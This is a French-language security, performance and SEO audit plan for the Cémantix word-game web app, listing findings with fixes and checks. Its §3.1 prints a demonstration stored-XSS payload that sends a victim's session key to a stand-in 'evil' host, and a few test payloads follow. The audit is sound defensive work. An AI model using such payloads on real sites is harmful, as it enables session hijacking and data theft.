# 🛡️ Plan d'optimisation — Sécurité · SEO · Performance · Qualité

> **Évolution :** [2026-10 · Sécurité, SEO, performance, qualité](../README.md) · document 1/2
> **Statut du document :** référence de conception, versionnée.
> **Avancement :** tenu à jour séparément dans [`02-avancement.md`](02-avancement.md) — ne pas
> reporter d'état d'avancement ici, ce fichier décrit **quoi faire et comment le vérifier**.
> **Branche analysée :** `feat/architecture-postgres-worker-web` @ `03af761`
> **Base de référence :** `origin/main` @ `68708ff` (5 commits d'avance, 0 de retard)
> **Date de l'audit :** 27/10/2026 · **Mise à jour :** 27/10/2026
> **Complément :** ce plan **prolonge** l'audit web du 26/10 sans le dupliquer — il couvre le
> périmètre **backend / données / infra / qualité** que l'audit web ne traitait pas, et remet à
> plat les points web **non fusionnés** (voir §2).

**Convention de lecture :** chaque finding porte un identifiant permanent (`SEC-`, `PERF-`,
`SEO-`, `QUAL-`, `A11Y-`, `RGPD-`) utilisé comme **clé de suivi** dans `02-avancement.md`. Un ID ne
change jamais et n'est jamais réattribué, même après abandon (statut `Renoncé` dans le suivi).

---

## 0. Méthodologie & périmètre

**Périmètre couvert :**

| Zone | Fichiers | Volume |
|---|---|---|
| Entrée / CLI | `cemantix_rag.py`, `src/cli/**` | 1 878 lignes |
| API HTTP | `src/api/server.py`, `src/api/routes/**` | 596 lignes |
| Jeu & sessions | `src/game/**` | 1 547 lignes |
| Données | `src/db/**`, `database/init.sql` | 858 lignes |
| Moteur RAG | `src/engine/**` | 951 lignes |
| Services | `src/services/daemon.py`, `web.py` | 457 lignes |
| Frontend | `volumes/web/**` (4 pages, 8 CSS, 10 JS) | 220 ko de CSS+JS |
| Infra | `Dockerfile`, `docker-compose.yml`, `.env.example` | — |

**Méthode :** chaque finding est noté avec (1) une **preuve `fichier:ligne` vérifiée dans le code**,
(2) un **impact exploitable concret**, (3) un **correctif précis**, (4) un **critère de vérification
exécutable**. Aucun point n'est listé sans avoir été lu.

**Sévérités :** 🔴 critique (exploitable à distance sans compte) · 🟠 élevé · 🟡 moyen · 🟢 faible.
**Marque ♻️ :** déjà corrigé sur `feat/optimisation-seo`, à **fusionner** et non à réécrire (§2).

---

## 1. Synthèse

### 1.1 Verdict global

L'architecture est **saine et inhabituellement propre pour un projet sans framework** :
couche d'accès aux données thread-safe avec repli SQLite, écritures atomiques partout
(`tmp` + `replace`), conteneurs durcis (`read_only`, `cap_drop: ALL`, `no-new-privileges`,
`user: "1000:1000"`), base non exposée sur l'hôte, SEO on-page déjà au-dessus de la moyenne.

Le risque n'est **pas** structurel, il est **localisé et ponctuel** :

1. **Le frontend injecte des données serveur dans du HTML** (`innerHTML` + `onclick` inline)
   → XSS stocké atteignable par n'importe qui crée un salon. **C'est le point le plus grave.**
2. **L'API ne se protège contre rien** : pas de limite de corps, pas de rate-limit, CORS `*`,
   clés de session à 16 bits, divulgation publique de la solution du jour.
3. **Deux bombes à retardement côté backend** : (a) chaque requête HTTP ouvre une connexion
   PostgreSQL jamais refermée (§PERF-06), (b) `/api/daily` est un full-scan pollé toutes les 30 s
   avec un cache-buster qui annule tout cache HTTP.
4. **Le SEO ne capte pas la longue traîne quotidienne** alors que c'est exactement le mot-clé visé
   (« cemantix du jour »), et le `sitemap.xml` ment sur ses `lastmod`.
5. **Aucun test, aucune CI, aucun `.gitignore`, dépendances non épinglées** → chaque correctif de
   ce plan est régressif par nature s'il n'est pas verrouillé immédiatement.

### 1.2 Matrice des risques

| # | Finding | Sév. | Coût d'exploit | Impact |
|---|---|---|---|---|
| SEC-01 | XSS stocké via pseudo multijoueur | 🔴 | 2 min, `curl` | Prise de contrôle du navigateur adverse (vol de `k=`, vol de session, defacement) |
| SEC-02 | Injection JS via `onclick="…('${g.word}')"` | 🔴 | 2 min | XSS persistant côté client |
| SEC-03 | `?reveal=true` public, sans auth ni limite | 🔴 | 1 ligne | Solution du jour publiée pour tous + indexable |
| SEC-05 | Clés multi/room à 16 bits dans l'URL | 🟠 | quelques secondes | Détournement de salon, spoiler, vol de tour |
| SEC-06 | Corps de requête non borné + `int()` non protégé | 🟠 | 1 ligne | DoS mémoire / traceback |
| PERF-06 | Fuite de connexions PG (`threading.local` + 1 thread/requête) | 🔴 | 30 min de trafic normal | Épuisement des FD / `max_connections` → indisponibilité complète |
| SEC-07 | Aucun rate-limit (oracle de score illimité) | 🟠 | un script | Résolution automatisée du mot du jour, surcharge |
| SEC-04 | CORS `*` + `Authorization` autorisé | 🟠 | 0 | Consommation d'API par des tiers |
| SEC-08 | En-têtes de sécurité non versionnés | 🟠 | — | Ni CSP ni HSTS garantis en prod |
| SEC-10 | Absence de `.gitignore` | 🟠 | un `git add -A` | Fuite `.env` / données PG / `data.json` |
| SEC-11 | Téléchargements sans vérification d'intégrité | 🟡 | MITM / cache | Espace vectoriel + dictionnaire non fiables |
| SEC-12 | Dépendances non épinglées, chromadb inévitable | 🟡 | — | Surface d'attaque + build non reproductible |
| SEC-13 | Image sans `USER`, sans digest | 🟡 | — | Défense en profondeur incomplète |
| SEC-14 | SQL en f-string, 11 `except: pass` | 🟡 | — | Erreurs muettes, dette de sécurité |
| SEC-15 | Doc `--export-web` → webroot avec mots non masqués | 🟡 | suivre la doc | Spoiler intégral si l'opérateur applique le README |

**Effort total estimé : 3 à 4 jours** (détail §8). Six quick wins couvrent ~70 % du risque en < 2 h.

---

## 2. ⚠️ Préalable bloquant : la dette du précédent audit n'est pas sur cette branche

`.idea/PLAN_WEB_AUDIT.md` (§ « Statut d'avancement 2026-10-27 ») annonce **21 des 22 points traités**.
**Vérification faite, ces correctifs sont absents de l'arbre de travail courant :**

| Preuve | Attendu (audit) | Réel sur la branche courante |
|---|---|---|
| `ls tools/` | `build_css_bundles.py`, `check_og_image.py` | **répertoire inexistant** |
| `src/api/server.py:38` | allowlist d'origines | `Access-Control-Allow-Origin: *` |
| `src/api/routes/system.py:26` | suppression du `reveal` public | `reveal` toujours accepté |
| `volumes/web/js/dashboard.js:50,131,157` | plus de `?reveal=true` | 3 occurrences |
| `volumes/web/og-image.jpg` | recadrée ~90 ko | **3 091 777 octets** |
| `volumes/web/index.html:44-48` | 1 feuille bundle/page | 5 feuilles distinctes |

`git branch --contains` confirme que `43a1d18` (bundle CSS), `9f18845` (manifeste PWA, icônes,
maillage archives), `786fe7b` (diagnostic og-image), `78b3e55` (polling) et `80e8b8e` existent
**uniquement sur `feat/optimisation-seo`** (locale + `origin`) — branche qui contient elle aussi
encore `reveal=true` et le CORS `*`.

**→ Décision à prendre avant toute implémentation (choix A recommandé) :**

- **A. Réconcilier d'abord** : PR `feat/optimisation-seo` → `main`, puis rebase de la branche
  3-tiers sur `main`. Les deux branches touchent **les mêmes fichiers**
  (`volumes/web/js/dashboard.js`, `volumes/web/index.html`, `src/api/server.py`) : intervenir sans
  cette étape **créera des conflits et fera perdre du travail déjà payé**.
- **B. Repartir de la branche courante** et réécrire le front (coût ≈ +0,5 j, perte de l'historique
  de review des PR #15→#18).

Les sections suivantes supposent l'**option A** : les points déjà traités sur
`feat/optimisation-seo` sont marqués ♻️ (à fusionner, pas à réécrire).

### 2.1 Ce que l'état réel des dépôts impose au plan

L'état des branches (SHA locaux vs GitHub, écarts, ce qui est poussé ou non) est **volatile** : il
est tenu dans [`02-avancement.md`](02-avancement.md) § « État des dépôts ». Deux conclusions sont en
revanche **structurelles** et engagent ce plan :

1. **35 commits de correctifs existent uniquement sur ce poste** (`feat/optimisation-seo`, sans
   upstream configuré) et constituent l'essentiel de la dette sécurité/perf décrite ici.
   → **L'option B n'est pas « +0,5 j » : elle détruit ce travail.** La première action du plan est
   donc `git push -u origin feat/optimisation-seo` (fast-forward pur vérifié), **avant** la Phase 0.
2. Deux faits **réduisent** la sévérité de SEC-10 :

   - **`.env` n'a jamais été versionné**, sur aucune branche ni aucun commit
     (`git log --all -- .env` est vide) → aucun secret à purger de l'historique, aucune rotation
     obligatoire pour exposition git. Le risque SEC-10 reste **prospectif** : sans `.gitignore`,
     un `git add -A` futur l'exposerait.
   - `feat/optimisation-seo` contient **déjà** un `.gitignore` (commit `e35cdf1`) couvrant `.idea/`,
     `cemantix_data/*.json`, `volumes/web/data.json`, `__pycache__/`, `.venv/`. SEC-10 est donc
     partiellement ♻️ : **fusionner et compléter** (il manque `.env`, `/local/`, `cemantix_data/*.npy`
     et `*_words.txt`), **surtout pas créer un second fichier concurrent**.

---

## 3. Sécurité 🔴 → 🟢

### 3.1 Chaîne d'attaque démontrée (SEC-01 + SEC-05)

```
Attaquant --POST /api/multi/create {"player_name":"<img src=x onerror=fetch('//evil/?k='+location.search)>"}
         -- src/api/routes/multi.py:48   player_name accepté tel quel (aucune borne, aucun filtre)
         -- src/game/manager.py:406      p1_name = player_name.strip() or "Joueur 1"
         -- src/db/multi.py              p1_data JSONB, en clair dans multi_rooms
Victime --GET /api/multi/status?r=DUEL-XXXX
         -- volumes/web/js/multi.js:126  <div>Adversaire : <strong>${g.opponent_name}</strong></div>
            -> innerHTML -> exécution du script -> lit location.search -> VOL DE LA CLÉ k=
         -- avec k=, l'attaquant joue à la place de la victime
            (routes/multi.py:82-85 : la clé EST le jeton d'identité, rien de plus)
```

Et la clé ne protège rien : `src/game/multi.py:56-57` génère `f"J1-{uuid.uuid4().hex[:4].upper()}"`
-> **4 chiffres hex = 65 536 valeurs**, et `manager.py:376` fait de même pour le salon
(`DUEL-` + 4 hex). L'énumération complète des salons actifs se fait en quelques secondes sur une
API sans aucune limitation de débit.

### 3.2 Correctifs — spécification

| ID | Fichier(s) | Correctif précis | Vérification |
|---|---|---|---|
| **SEC-01** | `routes/multi.py:48`, `manager.py:406` | Validation **serveur** : `player_name = re.sub(r"[^\w \-À-ÿ'.]", "", raw)[:24]`, 400 si vide après nettoyage. | POST avec `<img src=x onerror=alert(1)>` -> nom retourné sans `<` |
| **SEC-01b** | `js/utils.js` + `multi.js:126`, `dashboard.js`, `game.js`, `battle.js`, `trajectory.js` | Ajouter `export function escapeHtml(s)` (`&<>"'` -> entités) et l'appliquer à **toute** interpolation de donnée serveur ; auditer les **28 occurrences** d'`innerHTML`. | Pseudo `<svg onload=alert(1)>` affiché en texte brut |
| **SEC-02** | `battle.js:687`, `multi.js:938` | Supprimer les `onclick` inline -> `data-word="${escapeHtml(g.word)}"` + **un** listener délégué (le patron existe déjà, `multi.js:89-101`). Rend la CSP `script-src 'self'` possible. | `grep -rn 'onclick=.copyToClipboard' volumes/web/js` -> 0 |
| **SEC-03** | `routes/system.py:26-38`, `dashboard.js:50,131,157` | Retirer le paramètre public. Nouveau flux : `POST /api/daily/reveal` pose un cookie `HttpOnly; Secure; SameSite=Lax; Max-Age=3600` signé (HMAC) ; `/api/daily` ne révèle que si cookie valide **et** (`is_revealed` vrai **ou** date du puzzle < aujourd'hui — règle J+1). Supprimer `&t=${Date.now()}` (-> PERF-04). | `curl '…/api/daily?reveal=true'` -> `"word": null` |
| **SEC-04** | `server.py:37-40` | Allowlist `ALLOWED_ORIGINS` (env, défaut = domaine prod) ; écho de l'origine + `Vary: Origin` ; retirer `Authorization` des `Allow-Headers` (aucune auth HTTP utilisée) ; `OPTIONS` -> 204 sans en-tête CORS si origine inconnue. | `curl -H "Origin: https://evil.example" -i` -> aucune en-tête CORS |
| **SEC-05** | `game/multi.py:56-57`, `manager.py:376` | `secrets.token_hex` : salon = 4 octets (32 bits), clés = 16 octets (128 bits). Accepter l'ancien format 4 hex pendant une fenêtre de compatibilité pour ne pas casser les salons ouverts. | `grep -n uuid4 src/game/multi.py` -> 0 |
| **SEC-05b** | `src/db/multi.py`, `database/init.sql:64-65` | Stocker `player1_key_hash = HMAC-SHA256(SECRET_KEY, key)` au lieu de la clé en clair ; `SECRET_KEY` depuis l'env. | `SELECT player1_key FROM multi_rooms` vide |
| **SEC-06** | `server.py:56-64` | `int()` protégé -> 400 ; **413** si `Content-Length > 8192` ; 400 explicite si body non-JSON (aujourd'hui `None -> or {}`, `server.py:87`, erreur silencieuse). | `Content-Length: 99999999` -> 400/413, pas de traceback |
| **SEC-07** | nouveau `src/api/ratelimit.py`, branché dans `server.py:66-98` | Token bucket mémoire (clé = IP + chemin, IP prise depuis `X-Forwarded-For` **de Caddy seulement**) : `guess` 30/min, `create` et `join` 10/min, `daily` 60/min, `health` exempté ; `429` + `Retry-After`. **Justification :** `/api/game/guess` renvoie un score -> oracle permettant la résolution du mot du jour par force brute. | 60 requêtes -> les dernières en 429 |
| **SEC-08** | nouveau `deploy/Caddyfile` + service `caddy` dans `docker-compose.yml` | Versionner la config aujourd'hui **hors dépôt** (README:344-385). Ajouter `Strict-Transport-Security "max-age=31536000; includeSubDomains"`, une CSP (`default-src 'self'`; `script-src 'self'`; `style-src 'self'`; `img-src 'self' data:` — le favicon est un `data:` URI, `index.html:43`), `Referrer-Policy`, `Permissions-Policy "camera=(), microphone=(), geolocation=()"`, `X-Robots-Tag: noindex` sur `/api/*`. | `curl -I https://…/` -> 6 en-têtes présents |
| **SEC-09** | `server.py:100-102`, `routes/system.py:24` | Journaliser 1 ligne/requête (méthode, chemin normalisé, statut, durée, IP /24) ; **toujours** tracer POST et 4xx/5xx. Ne jamais renvoyer `str(e)` (`system.py:24`) -> message générique + id de corrélation. | `docker logs cemantix_web` trace POST et 429 |
| **SEC-10** | nouveau `.gitignore` racine | `.env`, `__pycache__/`, `*.pyc`, `.venv/`, `volumes/db/`, `volumes/web/data.json`, `cemantix_data/*.{bin,npy,npz,tmp,json}`, `cemantix_data/chroma_w2v/`. **Le README:446 documente ce fichier… qui n'existe pas.** | `touch .env && git status --short` -> non listé |
| **SEC-11** | `engine/vocab.py:44-67, 84-105` | Contrôle d'intégrité après téléchargement : taille minimale + **SHA-256 attendu** (`LEXIQUE_SHA256`, `W2V_SHA256`) ; échec => suppression du cache + erreur bruyante. Le `.part` repris (`vocab.py:87-89`) doit être re-vérifié en entier, pas renommé à l'aveugle sur un `416` (`vocab.py:92-94`). | Hash erroné => `RuntimeError`, rien de corrompu en cache |
| **SEC-12** | `requirements.txt`, `engine/vocab.py:16` | (a) Épingler via `requirements.lock` (`pip-compile`). (b) Rendre `import chromadb` **paresseux** : le conteneur web tourne en memmap (`cemantix_rag.py:116`, `with_chroma=False`) mais l'import en tête de module impose cette dépendance lourde (et tout son arbre transitive) aux 3 conteneurs. (c) `pip-audit` en CI. | `pip-audit` -> 0 ; `import src.engine` sans chromadb -> OK |
| **SEC-13** | `Dockerfile`, `docker-compose.yml` | `FROM python:3.12-slim-bookworm` + digest ; `useradd -r -u 1000 -m cemantix` + `USER cemantix` ; `pip install --root-user-action=ignore` ; `COPY --chown=1000:1000`. Ajouter `security_opt`/`cap_drop`/`read_only` au service `cemantix` (CLI, `compose:149-173`), **seul** service qui en est dépourvu. | `docker inspect` -> `User=1000:1000` ; `trivy image` |
| **SEC-14** | `db/daily.py:99`, `manager.py:429,450` + 9 autres | `LIMIT` en paramètre bindé ; remplacer les `except Exception: pass` (11 sites) par un log — aujourd'hui une panne d'écriture en base est **totalement silencieuse**. | `grep -rn -A1 "except Exception" src \| grep -c pass` -> 0 |
| **SEC-15** | `cemantix_rag.py:48`, `README.md:396-399`, `services/web.py:115` | Le code écrit dans `DATA_DIR` (`web.py:31`, correct) mais **la doc annonce encore « ./volumes/web/data.json »** et `build_web_data()` renvoie `history` avec `word` en clair (`web.py:115`). Corriger la doc **et** ajouter `mask_words: bool = True` à `build_web_data()`. | `grep -rn "volumes/web/data.json" README.md cemantix_rag.py` -> 0 |

### 3.3 Acquis à préserver (à verrouiller par tests)

| Point | Preuve |
|---|---|
| Conteneurs read-only, caps dropped, no-new-privileges, UID 1000 | `docker-compose.yml:30-39, 83-93, 134-144` |
| PostgreSQL **non publié** sur l'hôte (aucun `ports:`), réseau dédié | `docker-compose.yml:5-39, 175-179` |
| Requêtes paramétrées (`%s`) sur tout le chemin critique | `db/daily.py:46-70`, `solo.py`, `multi.py` |
| Anti-spoiler **côté serveur** (masquage + `••••••••` dans la trajectoire) | `routes/system.py:29-36` |
| Écritures atomiques (tmp + `replace`) : données web, heartbeat, sessions | `web.py:131-136`, `daemon.py:47-50`, `manager.py:73-76` |
| Nettoyage automatique des sessions (2 h solo / 7 j multi) | `manager.py:433-451` |
| Repli SQLite explicite pour tests/dev | `db/connection.py:24-40` |

---

## 4. Performance & Core Web Vitals

### 4.1 Le point chaud : `/api/daily` est un full-scan par requête

```
dashboard.js:114-116  setInterval(fetchDashboardData, 30000)      <- 1 appel / 30 s / onglet ouvert
dashboard.js:158      fetch(`/api/daily?t=${Date.now()}...`)      <- cache-buster : 0 % de cache HTTP
  -> routes/system.py:21-23   build_web_data()  (reconstruit TOUT, à chaque appel)
     -> services/web.py:42     load_history()
        -> db/daily.py:96-103  SELECT * FROM daily_puzzles ...   <- AUCUNE limite, toute la table
        -> services/web.py:47-94  4 filtres + 4 tri + agrégations sur tout l'historique
```

**Coût réel :** 2 880 requêtes/jour par onglet laissé ouvert, chacune en full-scan + tri complet,
et **aucune** réponse 304 possible à cause du `?t=`. Avec 30 jours d'historique, la charge est
négligeable ; avec 2 ans (730 lignes, `trajectory` JSONB = la colonne la plus lourde), ce devient
le premier coût CPU du conteneur web (limité à **384 Mo**, `docker-compose.yml:141-144`).

### 4.2 Correctifs performance

| ID | Fichier(s) | Correctif | Gain attendu |
|---|---|---|---|
| **PERF-01** | `routes/system.py:19-24` | Cache mémoire du payload (TTL 15 s, `threading.Lock`, clé `mask/don't mask`) + **ETag** (`If-None-Match` -> `304` corps vide). Le contenu ne change qu'une fois par jour. | ~-99 % de CPU API, fin du full-scan répété |
| **PERF-02** | `dashboard.js:50,131,158` | Supprimer les 3 `&t=${Date.now()}` ; laisser travailler `Cache-Control: no-cache` + ETag (convention déjà actée, README:342). | 304 au lieu de 200 plein |
| **PERF-03** | `dashboard.js:113-116` | Polling **conditionnel** : suspendre via `document.visibilityState` (le patron existe déjà pour le multi, commit `78b3e55` ♻️) ; passer de 30 s à 60 s une fois le mot du jour résolu (`is_revealed`). | -50 à -100 % d'appels |
| **PERF-04** | `db/daily.py:96-103`, `services/web.py:90-115` | Ajouter `get_history_summary(limit)` : agrégations (`total_solved`, `avg_tries`, `win_rate`) calculées **en SQL**, et liste d'historique bornée (défaut 90) + colonne `trajectory` exclue de la liste (elle n'est chargée que pour la modale de trajectoire). | charge proportionnelle à 90 lignes, pas à la table |
| **PERF-05** | `manager.py:52-88` (appelé par `routes/solo.py:74,85` et `routes/multi.py:130,167,182,197`) | `_save_sessions()` réécrit **toutes** les sessions (boucle PG + 2 fichiers JSON entiers) à **chaque coup joué** -> O(n) par requête. Sauver la seule session modifiée (`save_game_session(s)` / `save_multiplayer_session(m)`) ; miroir JSON devenu périodique (tâche du démon) ou supprimé. | écritures / guess : O(n) -> O(1) |
| **PERF-06** 🔴 | `db/connection.py:138-140, 201-227` + `api/server.py:15` | **Fuite de connexions** : `ThreadingHTTPServer` crée **un thread OS par requête** ; or les connexions sont stockées dans un `threading.local()` (`connection.py:138`) -> **chaque requête HTTP ouvre une nouvelle connexion PostgreSQL**, et chacune est retenue à jamais dans `self._all_conns` (`:227`), vidé uniquement par `reset()` (`:237-243`) que **rien n'appelle** en fonctionnement. Avec le polling multi (2,5 s/joueur) + dashboard (30 s), on tend vers l'épuisement des FD du conteneur et des 100 `max_connections` de PostgreSQL 16 par défaut. **C'est le défaut de fiabilité le plus grave de l'architecture 3-tiers.** Correctif : pool borné (`psycopg_pool.ConnectionPool(min_size=1, max_size=8)`, ou file de connexions réutilisables protégée par un `Lock`), retrait du set à la fermeture, et `wait_timeout`/`keepalive`. | fin de la fuite ; latence / requête -1 RTT |
| **PERF-06b** | `db/connection.py:203-217` | `get_connection()` exécute un `conn.execute("SELECT 1;")` de contrôle **à chaque appel** (donc 2x par requête : `transaction()` + `execute()`). Le remplacer par un contrôle conditionnel (toutes les N s, ou seulement après une `OperationalError`), et utiliser `pool.check_connection()` si on adopte le pool. | -2 requêtes réseau par appel |
| **PERF-07** | `server.py:34,105-116` | `protocol_version = "HTTP/1.1"` (le défaut `HTTP/1.0` **coupe le keep-alive** : chaque `fetch` = nouvelle connexion TCP vers Caddy), `daemon_threads = True`, `timeout = 10` sur le handler, `tcp_nodelay = True`, et borne haute de concurrence (sémaphore + `503` au-delà) pour compenser l'absence de pool de threads. | latence / fetch, robustesse en charge |
| **PERF-08** | `volumes/web/og-image.jpg` ♻️ | 3 091 777 o -> 1200x630 WebP/JPEG ~90 ko (`convert … -resize 1200x630^ -quality 82`). À faire sur la machine locale : ni Pillow ni ImageMagick ici, et le fichier est à 98 % des pixels (diagnostic de l'audit précédent). | -3 Mo sur chaque partage social, crawl budget |
| **PERF-09** | `index.html:44-48`, `play:34-38`, `battle:44-49`, `multi:44-49` ♻️ | 1 feuille par page (96 ko de CSS en 8 fichiers, 5 à 6 requêtes par page) + `<link rel="preload" as="style">`. Politique de cache inchangée (`no-cache` + ETag, pas de `?v=`). | -4 à -5 requêtes bloquantes/page |
| **PERF-10** | `js/*.js` (124 ko au total : `multi.js` 35 ko, `battle.js` 28 ko, `game.js` 26 ko) | (a) `<link rel="modulepreload">` des modules de page (`index.html:579` ne charge qu'`app.js`) ; (b) découper `multi.js` (1002 l.) et `battle.js` (839 l.) en `lobby.js` / `arena.js` pour ne charger la salle d'attente que sur la page concernée ; (c) minification optionnelle en pré-déploiement (le projet assume l'absence de build : la garder optionnelle). | -30 % d'octets sur `/multi/` et `/battle/` |
| **PERF-11** | `engine/solvers.py:88-92` | `timeout=300` sur l'appel LLM : acceptable **uniquement** parce que le chemin web est 100 % RAG (`game/battle.py:38` -> `RagDuelPlayer`, zéro LLM synchrone — vérifié). Le baisser à 120 s + 2 retries pour ne pas bloquer la boucle quotidienne du démon, et le rendre configurable (`LLM_TIMEOUT`). | fiabilité du cycle nocturne |

**Garde-fou :** le conteneur web est plafonné à **384 Mo** (`compose:141-144`) et partage l'espace
vectoriel en `np.memmap` lecture seule — ne pas introduire de cache non borné dans l'API
(PERF-01 doit rester un **seul** payload, pas un dictionnaire par requête).

---

## 5. SEO & AEO (moteurs + agents IA)

### 5.1 Diagnostic

L'acquisition visée est une requête **quotidienne et datée** (« cemantix du jour », « solution
cémantix aujourd'hui »). Or le site ne présente **que 4 pages permanentes** (`sitemap.xml:3-26`) et
**aucune URL par jour**. Tout le contenu qui répond réellement à l'intention de recherche — la
trajectoire du jour, les scores, le champ sémantique — n'existe qu'en JavaScript via`/api/daily`
et n'est donc **jamais indexé**. Le SEO on-page est pourtant déjà bon (4 canonical distinctes, JSON-LD,
contenu éditorial dans le HTML) : le manque est **structurel**, pas cosmétique.

### 5.2 Plan SEO

| ID | Action | Détail précis | Impact / Effort |
|---|---|---|---|
| **SEO-01** | **Pages d'archive quotidiennes indexables** (levier n°1) | Le démon, après chaque résolution (`services/daemon.py:294-308`), génère `volumes/web/jour/2026/10/27/index.html` à partir des données **réelles** de la résolution : date + n° de puzzle, top 10 de la trajectoire avec scores en °C et ‰, distribution thermique, champ sémantique déduit, solution masquée derrière un clic (règle J+1, cf. SEC-03). Maillage : jour J-1, J+1, page du mois, accueil. Canonical + title unique « Cémantix du 27 octobre 2026 : solution et trajectoire des indices ». | 🔴 élevé / 0,5 j |
| **SEO-01b** | Anti « thin content » | Exiger **> 400 mots uniques** par page (générés depuis les données, jamais un gabarit vide) ; si la résolution a échoué (`win: false`), publier la page sans solution mais avec l'analyse ; `noindex` explicite tant qu'aucune trajectoire n'est disponible. | protège le reste du site |
| **SEO-02** | `sitemap.xml` **généré**, plus figé | `sitemap.xml:5,11,17,23` portent tous `<lastmod>2026-10-25</lastmod>` — une date fausse est un signal de défiance pour Googlebot. Généré par le démon avec : les 4 pages permanentes (`lastmod` = date du dernier commit les concernant) + **toutes** les pages `jour/…` (`lastmod` = `solved_at`). Au-delà de 500 URLs, passer en `sitemap-index.xml` + `sitemap-archives-YYYY-MM.xml`. | 🔴 élevé / 0,25 j |
| **SEO-03** | `robots.txt` | Ajouter `Disallow: /api/` (les endpoints ne doivent pas être crawlés, surtout tant que SEC-03 n'est pas fermé) et `Disallow: /*?reveal=` ; conserver la ligne `Sitemap:` (`robots.txt:4`, correcte). | 🟠 / 5 min |
| **SEO-04** | `X-Robots-Tag: noindex` sur `/api/*` | Via le Caddyfile versionné (SEC-08) : aucune réponse JSON ne doit entrer dans l'index. | 🟠 / 5 min |
| **SEO-05** | Nettoyage des meta | Supprimer `<meta name="keywords">` (`index.html:18`, ignoré depuis 2009, signe de SEO daté) et `<meta name="title">` (`index.html:14`, redondant avec `<title>`). Harmoniser `robots` (`index.html:19` est riche, les 3 autres pages `index, follow` simples — OK, à assumer). | 🟢 / 10 min |
| **SEO-06** | JSON-LD : cohérence et fraîcheur | (a) `dateModified` **dynamique** (pas une chaîne figée) ; (b) ajouter `BreadcrumbList` sur les 4 pages + les archives ; (c) `creator`/`author` -> `Person` « Cyril Randon » + `sameAs` (GitHub, LinkedIn — déjà listés dans `llms.txt:8-11`) ; (d) `isPartOf` vers le `WebSite` ; (e) **pas de `aggregateRating`** sans avis réellement collectés ; (f) garder `FAQPage` pour les agents IA mais ne pas compter sur le rich snippet (restreint par Google depuis 2023). Valider chaque bloc sur `validator.schema.org`. | 🟠 / 0,25 j |
| **SEO-07** | Open Graph par page | Les 4 pages partagent la **même** `og:image` (`play:28`, `battle:28`, `multi:28`, `index.html:29`) — et elle pèse 3 Mo. Fournir 1 image dédiée par mode (accueil / play / battle / multi / archive du jour) en ≤ 100 ko, + `twitter:creator`. | 🟠 / 0,25 j |
| **SEO-08** | Icônes & installabilité ♻️ | `index.html:43` ne déclare **qu'un favicon en `data:` URI** : pas d'`apple-touch-icon`, pas de `manifest.webmanifest` (aucune occurrence dans les 4 pages). L'apport est dans le commit `9f18845` de `feat/optimisation-seo` → **à fusionner**. Le `data:` URI reste utile pour la CSP (`img-src data:`). | 🟠 / fusion |
| **SEO-09** | Fallback éditorial non-JS | Le tableau de bord est rendu à 100 % en JS (`dashboard.js:151-175`) : ajouter un `<noscript>` (aucune occurrence) avec le résumé du jour + lien vers l'archive, et un paragraphe de contenu réel dans le HTML des pages de jeu (le guide/FAQ n'existe que sur l'accueil). | 🟠 / 0,25 j |
| **SEO-10** | `hreflang` | Site mono-langue : déclarer `<link rel="alternate" hreflang="fr">` + `x-default` sur les 4 canonical (coût quasi nul, évite les confusions sur les requêtes « cemantle » anglophones). | 🟢 / 10 min |
| **SEO-11** | **Correction `ai-catalog.json`** (bug de conformité ARD) | `ai-catalog.json:10-11` déclare `"type": "application/openapi+json"` avec `"url": "…/api/daily"` — **l'URL pointe vers des données, pas vers une spécification OpenAPI**. Publier un vrai `volumes/web/openapi.json` (les 23 chemins sont déjà documentés dans les docstrings de `routes/*.py`) et pointer le catalogue dessus ; ajouter `llms-full.txt` (version longue de `llms.txt`) et une entrée dédiée à l'archive du jour. | 🟠 / 0,25 j |
| **SEO-12** | Mesure & non-régression | Lighthouse CI (perf/SEO/a11y/best-practices) sur chaque PR, Search Console (soumission du sitemap généré), contrôle `site:cemantix.cyril-randon.fr` hebdomadaire, vérification du `Referer` sur les liens d'invitation de duel (le `k=` ne doit pas fuiter — cf. SEC-05). | verrou de tout le reste |

### 5.3 Ce qu'il ne faut **pas** faire

- Ne pas indexer `/api/daily` (ni aujourd'hui via `?reveal=true`, ni demain) : un agrégateur qui
  stocke la solution détruit l'intérêt du produit **et** la raison d'être du mode anti-spoiler.
- Pas de `aggregateRating` inventé (motif de pénalité manuelle).
- Pas de page par jour **vide** : sans les 400 mots de données réelles (SEO-01b), l'archive
  quotidienne nuirait plus qu'elle n'aiderait.
- Ne pas réintroduire de `?v=` : la convention du projet est `no-cache` + revalidation ETag
  (README:342), et elle est déjà appliquée en production.

---

## 6. Robustesse, qualité & exploitation

| ID | Action | Détail précis | Effort |
|---|---|---|---|
| **QUAL-01** | **Socle de tests (stdlib `unittest`, aucune nouvelle dépendance)** | Créer `tests/` : `test_api_server.py` (limite de corps, CORS, 404/405, normalisation de chemin, ETag/304), `test_security.py` (sanitisation du pseudo, entropie des clés, refus de `?reveal=true`, 429), `test_sessions.py` (aller-retour sérialisation solo/multi, expiration), `test_db_sqlite.py` (repli + `save_game_session`/`load_game_session`), `test_web_data.py` (`mask_words`, justesse des agrégats), `test_daemon_schedule.py` (**passage à l'heure d'hiver/été** autour de 00h00 Europe/Paris — risque réel d'un ordonnanceur calé sur minuit). Lancer : `python -m unittest discover -s tests -v`. | 0,5 j |
| **QUAL-02** | CI GitHub Actions (inexistant : pas de `.github/`) | `.github/workflows/ci.yml` : (1) `ruff check src tools` ; (2) `python -m unittest discover` ; (3) `pip-audit -r requirements.txt` ; (4) `python tools/check_og_image.py` et `tools/check_js_balance.py` (à ré-importer, cf. QUAL-07) ; (5) `docker build -t cemantix:ci .` ; (6) Lighthouse CI sur les 4 pages (budget : perf ≥ 90, SEO = 100, a11y ≥ 95). | 0,25 j |
| **QUAL-03** | `.gitignore` + dérive documentaire | Créer le fichier (cf. SEC-10). Le README décrit aussi `docker-compose.local.yml` (`README.md:443`) et `.gitignore` (`:446`) **qui n'existent pas** : soit les créer, soit corriger l'arborescence documentée. | 15 min |
